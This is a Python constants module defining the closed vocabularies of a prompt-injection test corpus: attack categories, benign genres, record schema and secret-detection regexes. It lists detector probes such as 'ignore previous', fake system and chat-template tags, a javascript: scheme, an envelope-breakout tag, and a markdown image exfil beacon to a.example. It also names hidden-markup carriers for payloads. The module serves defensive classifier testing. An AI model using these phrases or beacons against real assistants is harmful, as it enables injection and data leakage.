"""The closed vocabularies of the injection corpus — the single source of each.

Every constant here is a *closed* set: the lint in ``scripts.corpus.records``
rejects anything outside it, and a new member is a reviewed edit to this file,
never an ad hoc string in a record. Rulings are those of
``kit_tools/specs/epic-forage-injection-corpus.md``; findings are the
validation findings recorded in ``kit_tools/specs/feature-corpus-harness.md``.
"""

from __future__ import annotations

import re
from collections.abc import Mapping
from pathlib import Path
from typing import Final

# Where the committed records live (ruling 7).
TESTS_CORPUS_ROOT: Final[Path] = (
    Path(__file__).resolve().parents[2] / "tests" / "corpus"
)

# Record kinds and the id prefix each carries (ruling 7).
KINDS: Final[tuple[str, ...]] = ("attack", "benign")
ID_PREFIXES: Final[Mapping[str, str]] = {"attack": "atk", "benign": "ben"}

# The 16 attack categories (ruling 14 counts over exactly these).
ATTACK_CATEGORIES: Final[tuple[str, ...]] = (
    "instruction_override",
    "authority_impersonation",
    "prompt_boundary",
    "encoded_payload",
    "suspicious_url",
    "exfil_beacon",
    "envelope_breakout",
    "line_anchored_role",
    "url_borne_envelope",
    "natural_language",
    "authority_seo",
    "hidden_markup",
    "boundary_straddle",
    "density_thinned",
    "repetition_camouflage",
    "sustained_midband",
)

# The 9 benign genres (ruling 14 counts over exactly these).
BENIGN_GENRES: Final[tuple[str, ...]] = (
    "news",
    "docs",
    "forum",
    "ecommerce",
    "code",
    "security_prose",
    "multilingual",
    "long_form",
    "over_defence_probe",
)

# Category vocabulary selected by kind (ruling 7).
CATEGORIES_BY_KIND: Final[Mapping[str, tuple[str, ...]]] = {
    "attack": ATTACK_CATEGORIES,
    "benign": BENIGN_GENRES,
}

# The three input surfaces, one per route (ruling 15).
SURFACES: Final[tuple[str, ...]] = ("search", "page", "text")

# Surface -> (required payload keys, optional payload keys) (ruling 7).
PAYLOAD_KEYS: Final[Mapping[str, tuple[tuple[str, ...], tuple[str, ...]]]] = {
    "search": (("title", "url", "content"), ("engine", "content_kind")),
    "page": (("url", "title", "head_html", "body_html"), ()),
    "text": (("filename", "text"), ()),
}

# `payload.content_kind` values for the search surface (ruling 7).
CONTENT_KINDS: Final[tuple[str, ...]] = ("snippet", "chunk")

# Record keys in the order the lint enforces, and which may be absent (ruling 7).
RECORD_KEYS: Final[tuple[str, ...]] = (
    "id",
    "kind",
    "category",
    "surface",
    "payload",
    "marker",
    "pinned",
    "pinned_reason",
    "source",
    "lang",
    "params",
    "notes",
)
REQUIRED_RECORD_KEYS: Final[frozenset[str]] = frozenset(
    {"id", "kind", "category", "surface", "payload", "source", "lang"}
)

# Outcomes a record may pin as acceptable on every applicable route (ruling 9).
PINNED_OUTCOMES: Final[tuple[str, ...]] = ("blocked", "flagged", "neutralised", "clean")

# Minimum marker length in characters (ruling 9: a marker must be distinctive).
MIN_MARKER_LENGTH: Final[int] = 12

# `source` keys, source kinds and framings (ruling 3, finding 13).
SOURCE_KEYS: Final[tuple[str, ...]] = (
    "kind",
    "name",
    "url",
    "licence",
    "revision",
    "record_ref",
    "framing",
)
SOURCE_KINDS: Final[tuple[str, ...]] = ("synthetic", "owned", "third_party")
FRAMINGS: Final[tuple[str, ...]] = ("indirect", "rehomed_direct")

# Third-party licences a record may carry — no share-alike, no non-commercial
# (ruling 3 / owner decision 3; findings 2, 3).
THIRD_PARTY_LICENCES: Final[frozenset[str]] = frozenset(
    {
        "MIT",
        "Apache-2.0",
        "BSD-2-Clause",
        "BSD-3-Clause",
        "CC0-1.0",
        "CC-BY-2.5",
        "CC-BY-3.0",
        "CC-BY-4.0",
        "PSF-2.0",
        "Unlicense",
        "LicenseRef-PublicDomain",
    }
)

# BCP-47 tag shape the lint accepts for `lang` (ruling 14 counts languages).
BCP47_PATTERN: Final[re.Pattern[str]] = re.compile(r"[a-z]{2,3}(-[A-Za-z0-9]{2,8})*")

# `params` values for `url_exception`: the declared non-RFC-2606 URL shapes
# (ruling 8). `ipv6_zone` admits the link-local / documentation IPv6 literal the
# audit -032 zone-id vector needs: neither a reserved name nor an RFC 1918 host.
URL_EXCEPTIONS: Final[tuple[str, ...]] = ("scheme", "private_ip", "ipv6_zone")

# `params` keys every category and genre may carry (ruling 7; spec 2 defines values).
_PARAM_KEYS: Final[frozenset[str]] = frozenset(
    {
        "density",
        "placement",
        "repeat",
        "carrier",
        "windows_min",
        "variant",
        "url_exception",
    }
)

# Allowed `params` keys per category AND per genre — all 25 members (ruling 7).
PARAMS_ALLOWED: Final[Mapping[str, frozenset[str]]] = {
    name: _PARAM_KEYS for name in (*ATTACK_CATEGORIES, *BENIGN_GENRES)
}

# RFC 2606 host rule: exact reserved names (and their subdomains) or a reserved
# TLD. `.localhost` is excluded because `url_validator` rejects it (ruling 8,
# finding 16).
RESERVED_DOMAINS: Final[tuple[str, ...]] = ("example.com", "example.net", "example.org")
RESERVED_TLDS: Final[tuple[str, ...]] = ("example", "test", "invalid")

# URL schemes admitted only under `params.url_exception: "scheme"` (ruling 8).
EXCEPTION_SCHEMES: Final[tuple[str, ...]] = ("data", "javascript")

# Secret shapes no corpus string may contain (finding 12). Only automated gate.
SECRET_PATTERNS: Final[Mapping[str, re.Pattern[str]]] = {
    "huggingface": re.compile(r"hf_[A-Za-z0-9]{20,}"),
    "github_classic": re.compile(r"ghp_[A-Za-z0-9]{20,}"),
    "github_fine_grained": re.compile(r"github_pat_[A-Za-z0-9_]{20,}"),
    "openai_style": re.compile(r"sk-[A-Za-z0-9]{20,}"),
    "anthropic_style": re.compile(r"sk-ant-[A-Za-z0-9_-]{20,}"),
    "aws_access_key": re.compile(r"AKIA[0-9A-Z]{16}"),
    "slack": re.compile(r"xox[abprs]-[A-Za-z0-9-]{10,}"),
    "private_key": re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----"),
    "generic_assignment": re.compile(
        r"(?i)(api[_-]?key|secret|token|password)\s*[:=]\s*['\"]?[A-Za-z0-9_\-]{16,}"
    ),
}

# Exfil bait uses this documented fake prefix with a short body (finding 12).
FAKE_KEY_PREFIX: Final[str] = "FAKEKEY-"
FAKE_KEY_MAX_BODY: Final[int] = 8

# Size caps: search fields at the orchestrator's caps, page HTML in bytes, text
# at the classifiable ceiling (ruling 8).
SEARCH_FIELD_CAPS: Final[Mapping[str, int]] = {
    "title": 512,
    "url": 2_048,
    "content": 2_000,
}
PAGE_HTML_MAX_BYTES: Final[int] = 200_000
TEXT_MAX_CHARS: Final[int] = 114_688

# Record-count floors, asserted from spec 5 US-002 (ruling 14).
MIN_RECORDS: Final[Mapping[str, int]] = {
    "attack_total": 200,
    "attack_per_category": 5,
    "benign_total": 250,
    "benign_per_genre": 15,
    "languages": 6,
    "multi_window": 20,
}

# Human names of `pipeline/stage2_structural.py`'s `_PATTERNS`, in registry
# order — a test pins the length (spec 1 US-001).
STAGE2_REGEX_NAMES: Final[tuple[str, ...]] = (
    "ignore_previous",
    "disregard_instructions",
    "new_directive",
    "system_bracket",
    "system_tag",
    "instructions_banner",
    "admin_bracket",
    "poppy_bracket",
    "assistant_line",
    "poppy_line",
    "system_line",
    "elevated_user",
    "base64_run",
    "rot13",
    "hex_escape",
    "system_fence",
    "instructions_fence",
    "im_start",
    "endoftext",
    "data_uri",
    "javascript_scheme",
    "private_ip_href",
    "exfil_image",
    "envelope_breakout",
)

# One literal per name that provokes it — a test runs every probe (spec 1 US-001).
STAGE2_REGEX_PROBES: Final[Mapping[str, str]] = {
    "ignore_previous": "ignore previous",
    "disregard_instructions": "disregard the instructions",
    "new_directive": "new directive",
    "system_bracket": "[SYSTEM]",
    "system_tag": "<system>",
    "instructions_banner": "---INSTRUCTIONS---",
    "admin_bracket": "[admin]",
    "poppy_bracket": "[poppy]",
    "assistant_line": "assistant:",
    "poppy_line": "POPPY:",
    "system_line": "System:",
    "elevated_user": "user with elevated",
    "base64_run": "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZn",
    "rot13": "rot13",
    "hex_escape": "\\x41\\x42\\x43\\x44",
    "system_fence": "```system",
    "instructions_fence": "```instructions",
    "im_start": "<|im_start|>",
    "endoftext": "<|endoftext|>",
    "data_uri": "data:text/",
    "javascript_scheme": "javascript:",
    "private_ip_href": 'href="http://10.0.0.1',
    "exfil_image": "![x](https://a.example/{{s}})",
    "envelope_breakout": "</retrieved_content>",
}

# Names exempt from spec 3's >= 2-benign floor: Forage/Poppy-internal tokens
# that cannot occur in real external text (spec 1 US-001).
STAGE2_REGEX_NO_BENIGN: Final[frozenset[str]] = frozenset(
    {"poppy_bracket", "poppy_line", "envelope_breakout"}
)

# `params.variant` for attacks: the obfuscation transform (spec 2 US-001).
ATTACK_VARIANTS: Final[tuple[str, ...]] = (
    "plain",
    "case",
    "entity",
    "zwsp",
    "split_tags",
    "confusable",
    "second_paragraph",
    "url_query",
    "url_path",
    "title_field",
)

# `params.carrier` for `hidden_markup`: where in the page the payload hides — the
# eight in-the-wild placements (spec 2 US-002; landscape finding 11).
ATTACK_CARRIERS: Final[tuple[str, ...]] = (
    "jsonld",
    "meta_description",
    "og_description",
    "css_offscreen",
    "hidden_div",
    "html_comment",
    "alt_text",
    "title_stuffing",
)

# `params.variant` vocabulary selected by kind: benign names the stage-2
# regex a record deliberately trips (spec 3 US-001).
VARIANTS_BY_KIND: Final[Mapping[str, tuple[str, ...]]] = {
    "attack": ATTACK_VARIANTS,
    "benign": STAGE2_REGEX_NAMES,
}
